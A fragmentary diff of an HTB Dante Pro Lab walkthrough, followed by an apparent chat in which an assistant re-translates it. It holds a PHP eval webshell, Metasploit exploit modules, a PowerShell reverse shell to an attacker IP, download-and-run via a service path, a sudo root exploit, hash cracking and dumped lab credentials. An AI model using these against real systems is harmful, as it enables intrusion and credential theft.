@@ -1,2 +1,1155 @@
 # Dante
 - wpscan --url http://10.10.110.100:65000/wordpress --enumerate #enumerate wordpress
+
+
+[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | Reference: https://codex.wordpress.org/Debugging_in_WordPress
+
+[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
+ | Found By: Atom Generator (Aggressive Detection)
+ |  - http://10.10.110.100:65000/wordpress/?feed=atom, <generator uri="https://wordpress.org/" version="5.4.1">WordPress</generator>
+ | Confirmed By: Style Etag (Aggressive Detection)
+ |  - http://10.10.110.100:65000/wordpress/wp-admin/load-styles.php, Match: '5.4.1'
+
+[i] The main theme could not be detected.
+
+[+] Enumerating Vulnerable Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[i] User(s) Identified:
+
+[...]
+
+eval($_POST["pass"]);
+But when saving, got an error: "Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP." This error is a feature added after WordPress 4.9, preventing modification of PHP files in the WP file editor.
+Using Plugin Editor to modify plugin files can save normally, for example, modifying akismet/class.akismet-cli.php. After modification, access: /wordpress/wp-content/plugins/akismet/class.akismet-cli.php.
+MSF also has integrated related exploits, but it seems unable to upload payload properly.
+use exploit/unix/webapp/wp_admin_shell_upload
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.5
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lport 3333
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD Toyota
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME james
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set targeturi /wordpress
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts 10.10.110.100
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rport 65000
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
+
+[...]
+
+root@DANTE-WEB-NIX01:~# ls
+flag.txt  snap  wordpress.tar.bz2  wordpress_backup
+root@DANTE-WEB-NIX01:~# cat flag.txt 
+DANTE{Too_much_Pr1v!!!!}
+Tunnel Setup
+chisel
+Using pwncat-cs to connect via SSH and upload chisel
+pwncat-cs 'ssh://balthazar:TheJoker12345!@10.10.110.100'
+upload chisel xxx
+First, use chisel to build a SOCKS tunnel.
+./chisel server -p 12345 --reverse # local
+./chisel client 10.10.14.5:12345 R:0.0.0.0:1080:socks # remote
+msf
+Can also use MSF meterpreter to build a SOCKS tunnel:
+use multi/manage/autoroute
+set session 1
+exploit
+use auxiliary/server/socks_proxy
+set SRVPORT 9090
+exploit -j
+Internal Network Asset Scanning
+After establishing a tunnel, internal network asset scanning can be performed
+fscan
+fscan is quite efficient. Combined with fscanOutPut, results can be displayed in table format. fscan supports the -socks5 parameter to specify a proxy:
+fscan -h 172.16.1.0/24 -socks5 127.0.0.1:1080
+Goby
+Goby's graphical interface makes analysis more convenient. When proxy scanning, use SOCKS proxy.
+Total of 11 IPs, also scanned out MS17-010
+Ehole: Fingerprint Recognition
+ehole can perform further fingerprint scanning on web services, also supports -socks parameter for proxy scanning.
+ehole finger -l webapp.txt --proxy socks5://127.0.0.1:1080
+
+[...]
+172.16.1.10 SlackMigration - readable172.16.1.17 forensics - readable and writable
+We can use smbclient to connect.
+p smbclient \\\\172.16.1.10\\SlackMigration -U "anonymous%"
+In the SlackMigration share on 172.16.1.10, there is an admintasks.txt file, which serves as hint information.
+-Remove wordpress install from web root - PENDING
+-Reinstate Slack integration on Ubuntu machine - PENDING
+-Remove old employee accounts - COMPLETE
+-Inform Margaret of the new changes - COMPLETE
+-Remove account restrictions on Margarets account post-promotion to admin - PENDING
+From this we can derive the following information:
+
+The WordPress service deployed on 172.16.1.10 runs with root privileges.
+User Margarets has administrator privileges.
+
+Connect to 172.16.1.17 forensics
+p smbclient \\\\172.16.1.17\\forensics -U "anonymous%"
+A monitor file can be found in it.
+└─$ file monitor
+monitor: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535)
+The monitor is a pcap file, open it with Wireshark. Filtering HTTP packets reveals authentication messages in the traffic.
+admin/password6543
+admin/Password6543
+Linux: 172.16.1.10
+Port 80 File Inclusion Leading to RCE
+http://172.16.1.10/nav.php?page=about.html
+The page parameter has directory traversal vulnerability, leading to arbitrary file reading.
+http://172.16.1.10/nav.php?page=../../../../../../../etc/passwd
+Results:
+[...]
+conv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode
+
+[...]
+Messages from Slack:
+"text": "<@U013CT40QHM> set the channel purpose: discuss network security",
+"text": "<@U014025GL3W> has joined the channel",
+"text": "Hi Margaret, I created the channel so we can discuss the network security - in private!",
+"text": "Hi Margaret,
+"text": "Great idea, Frank",
+"text": "Great idea,
+"text": "We need to migrate the Slack workspace to the new Ubuntu images, can you do this today?",
+"text": "We need to migrate the Slack workspace to the new Ubuntu images,
+"text": "Sure, but I need my password for the Ubuntu images, I haven't been given it yet",
+"text": "Sure, but I need my password for the Ubuntu images,
+"text": "Ahh sorry about that - its STARS5678FORTUNE401",
+"text": "Thanks very much, I'll get on that now.",
+"text": "Thanks very much,
+"text": "No problem at all. I'll make this channel private from now on - we cant risk another breach",
+"text": "Please get rid of my admin privs on the Ubuntu box and go ahead and make yourself an admin account",
+"text": "Thanks, will do",
+"text": "Thanks,
+"text": "I also set you a new password on the Ubuntu box - TractorHeadtorchDeskmat, same username",
+"text": "I also set you a new password on the Ubuntu box - TractorHeadtorchDeskmat,
+The correct password should be TractorHeadtorchDeskmat.
+Privilege Escalation to root: Python Hijacking
+Note an entry in the linPEAS results: Searching root files in home dirs, which includes the file: /home/frank/apache_restart.py
+import call
+import urllib
+url = urllib.urlopen(localhost)
+page= url.getcode()
+if page ==200:
+        print ("We're all good!")
+else:
+        print("We're failing!")
+        call(["systemctl start apache2"], shell=True)
+This script is owned by root and its function is to monitor apache2 status and start apache2. But the script doesn't have a loop added, so we suspect whether it uses cron jobs or a while loop to execute.
+Using ps to view processes, found the script is not running directly.
+ps aux | grep apache_restart
+frank      23140  0.0  0.0   3312   720 ?        S    22:45   0:00 grep apache_restart
+Check cron directories, searching for apache_restart also yields no results. The cron job might be hidden.
+cd /etc/cron.d
+grep -r apache_restart
+Using pspy can find hidden cron jobs. Can see the root user directly executes apache_restart.py with /usr/sbin/CRON.
+[...]
+nc -lvp 9998
+Write the Python script to /home/frank/urllib.py
+After waiting a while, successfully got root shell.
+└─$ nc -lvvp 9998
+Listening on 0.0.0.0 9998
+Connection received on 10.10.110.3 19185
+root@DANTE-NIX02:~# pwd
+pwd
+/root
+root@DANTE-NIX02:~# cat /root/flag.txt
+cat /root/flag.txt
+DANTE{L0v3_m3_S0m3_H1J4CK1NG_XD}
+root@DANTE-NIX02:~# 
+Linux: 172.16.1.17
+Open ports:
+172.16.1.17	80
+172.16.1.17	139
+172.16.1.17	445
+172.16.1.17	10000
+Port 80 Source Code Leak
+Port 80 has an Apache service deployed, providing a webmin-1.900.zip file.
+The leaked webmin version is 1.900, which has numerous vulnerabilities that can be searched directly in searchsploit.
+[...]
+920 - 'rpc.cgi' Remote Code Execution (Metasploit)                              | linux/webapps/47330.rb
+------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+[...]
+$gconfig{'sysinfo'} = 0 if ($gconfig{'sysinfo'} == 1);
+
+if ($gconfig{'texttitles'}) {
+    @args = ( $text{'main_title2'}, undef );
+    }
+else {
+    @args = ( $gconfig{'nohostname'} ? $text{'main_title2'} :
+            &text('main_title', $ver, $hostname, $ostr),
+          "images/webmin-blue.png" );
+    if ($gconfig{'showlogin'}) {
+        $args[0] = $remote_user." : ".$args[0];
+        }
+    }
+&header(@args, undef, undef, 1, 1,
+    $tconfig{'brand'} ? 
+    "<a href=$tconfig{'brand_url'}>$tconfig{'brand'}</a>" :
+    $gconfig{'brand'} ? 
+    "<a href=$gconfig{'brand_url'}>$gconfig{'brand'}</a>" :
+    "<a href=http://www.webmin.com/>$text{'main_homepage'}</a>"
+    );
+print "<center><font size=+1>",
+    &text('main_version', $ver, $hostname, $ostr),"</font></center>\n"
+    if (!$gconfig{'nohostname'});
+print "<hr id='header_hr'><p>\n";
+
+print $text{'main_header'};
+[...]
+C:\Windows\system32>
+Successfully obtained SYSTEM shell.
+View users in the Users directory:
+12/25/2023  03:08 AM    <DIR>          katwamba
+01/08/2021  12:26 PM    <DIR>          MediaAdmin$
+08/22/2013  03:39 PM    <DIR>          Public
+06/10/2020  11:23 AM    <DIR>          test
+07/19/2022  04:33 PM    <DIR>          xadmin
+Users:
+
+katwamba
+test
+xadmin
+
+In the katwamba\Desktop directory, found flag.txt. This directory also has an employee_backup.xlsx file, download it.
+meterpreter > download "C:\Users\katwamba\Desktop\employee_backup.xlsx" /project/HTB/ProLab/Dante
+The file contains many usernames and passwords.
+asmith	Princess1
+smoggat	Summer2019
+tmodle	P45678!
+ccraven	Password1
+kploty	Teacher65
+jbercov	4567Holiday1
+whaguey	acb123
+dcamtan	WorldOfWarcraft67
+tspadly	RopeBlackfieldForwardslash
+ematlis	JuneJuly1TY
+fglacdon	FinalFantasy7
+tmentrso	65RedBalloons
+dharding	WestminsterOrange5
+smillar	MarksAndSparks91
+bjohnston	Bullingdon1
+iahmed	Sheffield23
+plongbottom	PowerfixSaturdayClub777
+jcarrot	Tanenbaum0001
+lgesley	SuperStrongCantForget123456789
+User Comment Information Leak
+When viewing users with net users, found a user mrb3n. Further checking this user's information reveals the password and flag in the Comment field.
+mrb3n/S3kur1ty2020!
+C:\Windows\system32>net user mrb3n
+net user mrb3n
+User name                    mrb3n
+Full Name                    mrb3n
+Comment                      mrb3n was here. I used keep my password S3kur1ty2020! here but have since stopped.  DANTE{1_jusT_c@nt_st0p_d0ing_th1s}
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+[...]
+INFO: Found AD domain: dante.local
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dante.local:88)] [Errno 111] Connection refused
+INFO: Connecting to LDAP server: DANTE-DC01.DANTE.local
+ERROR: Failure to authenticate with LDAP! Error 8009030C: LdapErr: DSID-0C0905FB, comment: AcceptSecurityContext error, data 52e, v2580
+Traceback (most recent call last):
+  File "/home/kali/.local/bin//bloodhound-python", line 8, in <module>
+    sys.exit(main())
+             ^^^^^^
+  File "/home/kali/.local/lib/python3.11/site-packages/bloodhound/__init__.py", line 338, in main
+    bloodhound.run(collect=collect,
+  File "/home/kali/.local/lib/python3.11/site-packages/bloodhound/__init__.py", line 79, in run
+    self.pdc.prefetch_info('objectprops' in collect, 'acl' in collect, cache_computers=do_computer_enum)
+  File "/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/domain.py", line 523, in prefetch_info
+    self.get_objecttype()
+  File "/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/domain.py", line 240, in get_objecttype
+    self.ldap_connect()
+  File "/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/domain.py", line 69, in ldap_connect
+    ldap = self.ad.auth.getLDAPConnection(hostname=self.hostname, ip=ip,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/authentication.py", li
+[...]
+-10203,10443,10616,10628,11000,11099,11211,11234,11333,12174,12203,12221,12345,12397,12401,13364,13500,13838,14330,15200,16102,17185,17200,18881,19300,19810,20010,20031,20034,20101,20111,20171,20222,22222,23472,23791,23943,25000,25025,26000,26122,27000,27017,27888,28222,28784,30000,30718,31001,31099,32764,32913,34205,34443,37718,38080,38292,40007,41025,41080,41523-41524,44334,44818,45230,46823-46824,47001-47002,48899,49152,50000-50004,50013,50500-50504,52302,55553,57772,62078,62514,65535" -o 172.16.2.5_fscan_result.txt
+[...]
+DANTE-DC02$:aes128-cts-hmac-sha1-96:4c917008232d55247ef311d89437a078
+DANTE-DC02$:des-cbc-md5:b5497fb9eac17f5d
+[*] Cleaning up...
+Privilege Escalation: Pass the Hash
+After obtaining Administrator's hash, we can use Pass the Hash to get Administrator privileges.
+[...]
+[*] Started reverse TCP handler on 10.10.14.5:5555 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[!] The service is running, but could not be validated. Service 'inSyncCPHService' exists.
+[*] Connecting to 127.0.0.1:6064 ...
+[*] Sending packet (260 bytes) to 127.0.0.1:6064 ...
+[*] Sending stage (175686 bytes) to 10.10.110.3
+[*] Meterpreter session 41 opened (10.10.14.5:5555 -> 10.10.110.3:21927) at 2023-12-26 20:01:51 -0500
+
+meterpreter >
+Linux: 172.16.1.12
+Open ports:
+172.16.1.12	21
+172.16.1.12	80
+172.16.1.12	22
+172.16.1.12	443
+172.16.1.12	3306
+Port 80 SQL Injection
+Port 80 is also a xampp service, basically the same version as 172.16.1.13.
+python /webtools/dirscan/dirsearch/dirsearch.py -u http://172.16.1.12 -e php -p socks5://localhost:1080 -w /webtools/dicts/SecLists/Discovery/Web-Content/common.txt
+
+[20:11:05] Starting:                                                                                                                                            
+[20:11:27] 301 -  232B  - /blog  ->  http://172.16.1.12/blog/               
+[20:11:31] 403 -    1KB - /cgi-bin/                                         
+[20:11:37] 301 -  237B  - /dashboard  ->  http://172.16.1.12/dashboard/     
+[20:11:47] 200 -   30KB - /favicon.ico                                      
+[20:11:56] 301 -  231B  - /img  ->  http://172.16.1.12/img/                 
+[20:12:17] 403 -    1KB - /phpmyadmin                                       
+[20:12:48] 301 -  237B  - /webalizer  ->  http://172.16.1.12/webalizer/  
+Scanned a /blog directory.
+[...]
+ben@DANTE-NIX04:~/.tmp$ ./.pw
+root@DANTE-NIX04:/home/ben/.tmp# 
+Privilege Escalation: sudo < 1.8.28
+sudo version is 1.8.27.
+ben@DANTE-NIX04:~/.tmp$ sudo -V
+Sudo version 1.8.27
+Sudoers policy plugin version 1.8.27
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.27 
+hacktricks records a payload for sudo versions less than 1.8.28
+sudo -u#-1 /bin/bash
+Can directly escalate to root
+ben@DANTE-NIX04:~/.tmp$ sudo -u#-1 /bin/bash
+root@DANTE-NIX04:/home/ben/.tmp# 
+The /etc/shadow file contains a hint: CrackMe.
+julian:$1$CrackMe$U93HdchOpEUP9iUxGVIvq/:18439:0:99999:7:::
+Save the /etc/passwd and /etc/shadow files locally, use unshadow to combine them into one file, delete other lines in the file, leave only julian, and finally use john to crack.
+unshadow 172.16.1.12_etc_passwd 172.16.1.12_shadowhash > 172.16.1.12_unshadow
+
+john --wordlist=/webtools/dicts/rockyou.txt 172.16.1.12_unshadow
+First crack yielded no results, but john prompts us to use the parameter --format=md5crypt-long
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:19 DONE (2023-12-27 07:13) 0g/s 712123p/s 712123c/s 712123C/s !!!0mc3t..*7¡Vamos!
+Session completed. 
+After specifying the new encryption format, can successfully crack the plaintext as manchesterunited
+john --wordlist=/webtools/dicts/rockyou.txt 172.16.1.12_unshadow --format=md5crypt-long
+[...]
+----------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                   |  Path
+----------------------------------------------------------------------------------------------------------------- ---------------------------------
+IObit Uninstaller 10 Pro - Unquoted Service Path                                                                 | windows/local/49371.txt
+IObit Uninstaller 9.1.0.8 - 'IObitUnSvr' Unquoted Service Path                                                   | windows/local/47538.txt
+IObit Uninstaller 9.5.0.15 - 'IObit Uninstaller Service' Unquoted Service Path                                   | windows/local/48543.txt
+----------------------------------------------------------------------------------------------------------------- ---------------------------
+The History.txt in the directory contains version information, version is 9.5, which has an Unquoted Service Path privilege escalation vulnerability. Exploiting this vulnerability requires writing a malicious IObit.exe to C:\Program Files (x86)\IObit, but this path doesn't have write permissions.
+[...]
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+Encode with UTF-16LE and base64, then fill and write to runme.bat
+Download runme.bat to c:\temp.
+mkdir c:\temp
+cd c:\temp
+(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5:9999/runme.bat','c:\temp\runme.bat')
+Listen locally on port 9001:
+nc -lvp 9001
+Then modify IObitUnSvr configuration on the target.
+sc.exe stop IObitUnSvr
+sc.exe config IObitUnSvr binPath="cmd.exe /c c:\temp\runme.bat"
+sc.exe qc IObitUnSvr
+sc.exe start IObitUnSvr
+Starting IObitUnSvr will receive a shell.
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       08/01/2021     05:34             33 flag.txt                                                              
+-a----       14/07/2020     03:18           1417 Microsoft Edge.lnk
+[...]
+[+] Assessing machine state...                                                                                                                      
+[+] Checking for opportunities...
+[+][polkit:CVE-2021-3560] Polkit version is vulnerable!
+[+][polkit:CVE-2021-3560] Opportunity found, trying to exploit it...
+[+][polkit:CVE-2021-3560] Sampling timing of user creation command...
+[+][polkit:CVE-2021-3560] Average time for user creation to fail authentication is 5.879881ms
+[+][polkit:CVE-2021-3560] Attempting to create user 'traitor795' by forcing UID=0...
+[+][polkit:CVE-2021-3560] User 'traitor795' was created with UID (1002)!
+[+][polkit:CVE-2021-3560] Sampling timing of password set command...
+[+][polkit:CVE-2021-3560] Average time for password set to fail authentication is 5.447048ms
+[+][polkit:CVE-2021-3560] Attempting to set user password...
+[+][polkit:CVE-2021-3560] Finished attempting to set password.
+[+][polkit:CVE-2021-3560] Setting up tty...
+[+][polkit:CVE-2021-3560] Attempting authentication as new user...
+[+][polkit:CVE-2021-3560] Authenticated as traitor795 (1002)!
+[+][polkit:CVE-2021-3560] Attempting escalation to root...
+[+][polkit:CVE-2021-3560] Authenticated as root!
+[+][polkit:CVE-2021-3560] Writing payload...
+
+root@DANTE-NIX07:~# ls
+Privilege Escalation: disk Group User Exploitation
+User ian belongs to the disk group. "disk" is a special-purpose system group used to grant users disk access permissions. This means users belonging to the "disk" group may have specific disk access permissions, such as read-write operations on hard drives.
+uid=1001(ian) gid=1001(ian) groups=1001(ian),6(disk)
+After switching to ian, view /proc/self/mounts to get disk information: cat /proc/self/mounts|grep 'sda'
+[...]
+% done (76449/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  76.24% done (77948/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  77.70% done (79447/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  79.17% done (80946/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  80.63% done (82445/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  82.10% done (83944/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  83.57% done (85443/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  85.03% done (86942/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  86.50% done (88441/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  87.96% done (89940/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  89.43% done (91439/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  90.90% done (92938/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  92.36% done (94437/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  93.83% done (95936/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  95.29% done (97435/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  96.76% done (98934/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  98.19% done (100400/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  99.59% done (101827/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress - 100.00% done (102246/102246
+
+Note: This is a technical penetration testing document describing exploitation of the HTB Dante Pro Lab. The content includes WordPress exploitation, network pivoting with chisel/MSF, internal network scanning with fscan/Goby/ehole, SMB enumeration, file inclusion vulnerabilities, Python library hijacking, privilege escalation techniques (sudo exploits, disk group exploitation, polkit CVE-2021-3560), Pass-the-Hash attacks, SQL injection, and various Windows/Linux privilege escalation methods.
+give me all in wordI cannot directly create a Word document file, but I can provide you with the complete English translation in a format you can easily copy into Microsoft Word. Here it is:
+
+HTB ProLab Dante - Complete Walkthrough (English Translation)
+WordPress Exploitation
+Initial Reconnaissance
+[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | Reference: https://codex.wordpress.org/Debugging_in_WordPress
+
+[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
+ | Found By: Atom Generator (Aggressive Detection)
+ |  - http://10.10.110.100:65000/wordpress/?feed=atom, <generator uri="https://wordpress.org/" version="5.4.1">WordPress</generator>
+ | Confirmed By: Style Etag (Aggressive Detection)
+ |  - http://10.10.110.100:65000/wordpress/wp-admin/load-styles.php, Match: '5.4.1'
+
+[i] The main theme could not be detected.
+
+[+] Enumerating Vulnerable Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[i] User(s) Identified:
+Exploiting WordPress Theme Editor
+Attempted to inject PHP code:
+eval($_POST["pass"]);
+However, when saving, received the following error:
+
+"Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP."
+
+This error is a security feature added in WordPress 4.9+, which prevents direct modification of PHP files through the WP file editor.
+Solution: Use the Plugin Editor to modify plugin files instead. For example, modify akismet/class.akismet-cli.php. After modification, access the shell via:
+/wordpress/wp-content/plugins/akismet/class.akismet-cli.php
+Metasploit Alternative
+MSF also has an integrated exploit module, though payload upload may not work properly:
+use exploit/unix/webapp/wp_admin_shell_upload
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.5
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lport 3333
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD Toyota
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME james
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set targeturi /wordpress
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts 10.10.110.100
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rport 65000
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
+First Flag
+root@DANTE-WEB-NIX01:~# ls
+flag.txt  snap  wordpress.tar.bz2  wordpress_backup
+
+root@DANTE-WEB-NIX01:~# cat flag.txt 
+DANTE{Too_much_Pr1v!!!!}
+
+Network Pivoting & Tunnel Setup
+Method 1: Chisel SOCKS Proxy
+First, use pwncat-cs to connect via SSH and upload chisel:
+pwncat-cs 'ssh://balthazar:TheJoker12345!@10.10.110.100'
+upload chisel /path/to/chisel
+Build a SOCKS tunnel using chisel:
+# On your local machine (attacker)
+./chisel server -p 12345 --reverse
+
+# On the remote target
+./chisel client 10.10.14.5:12345 R:0.0.0.0:1080:socks
+Method 2: Metasploit SOCKS Proxy
+Alternatively, use MSF meterpreter to build a SOCKS tunnel:
+use multi/manage/autoroute
+set session 1
+exploit
+
+use auxiliary/server/socks_proxy
+set SRVPORT 9090
+exploit -j
+
+Internal Network Asset Scanning
+After establishing tunnels, perform internal network reconnaissance.
+Tool 1: fscan
+fscan is highly efficient for network scanning. Combined with fscanOutPut, results can be displayed in table format. fscan supports the -socks5 parameter:
+fscan -h 172.16.1.0/24 -socks5 127.0.0.1:1080
+Tool 2: Goby (GUI Scanner)
+Goby's graphical interface makes analysis more convenient. Configure SOCKS proxy for scanning.
+Results: Total of 11 IPs discovered, including hosts vulnerable to MS17-010.
+Tool 3: Ehole (Fingerprint Recognition)
+ehole performs detailed web service fingerprinting and supports -socks parameter for proxy scanning:
+ehole finger -l webapp.txt --proxy socks5://127.0.0.1:1080
+Sample Output:
+[ http://172.16.1.19 | Apache/2.4.41 (Ubuntu) | 200 | 28842 | Dante Hosting ]
+[ https://172.16.1.102 | OpenSSL | Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.0 | 200 | 1237 | Dante Marriage Registration System :: Home Page ]
+[ https://172.16.1.13/dashboard/ | XAMPP Default Page, OpenSSL | Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7 | 200 | 7576 | Welcome to XAMPP ]
+[ https://172.16.1.12/dashboard/ | XAMPP Default Page, Perl, mod_perl, OpenSSL | Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3 | 200 | 7574 | Welcome to XAMPP ]
+[ http://172.16.1.12 | XAMPP Default Page, Perl, mod_perl, OpenSSL | Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3 | 200 | 7574 | Welcome to XAMPP ]
+[ http://172.16.1.13 | XAMPP Default Page, OpenSSL | Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7 | 200 | 7576 | Welcome to XAMPP ]
+[ https://172.16.1.13 | XAMPP Default Page, OpenSSL | Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7 | 200 | 7576 | Welcome to XAMPP ]
+[ https://172.16.1.12 | XAMPP Default Page, Perl, mod_perl, OpenSSL | Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 | 200 | 7574 | Welcome to XAMPP ]
+
+SMB Enumeration
+Accessible Shares
+172.16.1.10:
+
+Share: SlackMigration (readable)
+
+172.16.1.17:
+
+Share: forensics (readable and writable)
+
+Connecting to SMB Shares
+smbclient \\\\172.16.1.10\\SlackMigration -U "anonymous%"
+Finding 1: admintasks.txt on 172.16.1.10
+In the SlackMigration share, there is an admintasks.txt file containing hints:
+-Remove wordpress install from web root - PENDING
+-Reinstate Slack integration on Ubuntu machine - PENDING
+-Remove old employee accounts - COMPLETE
+-Inform Margaret of the new changes - COMPLETE
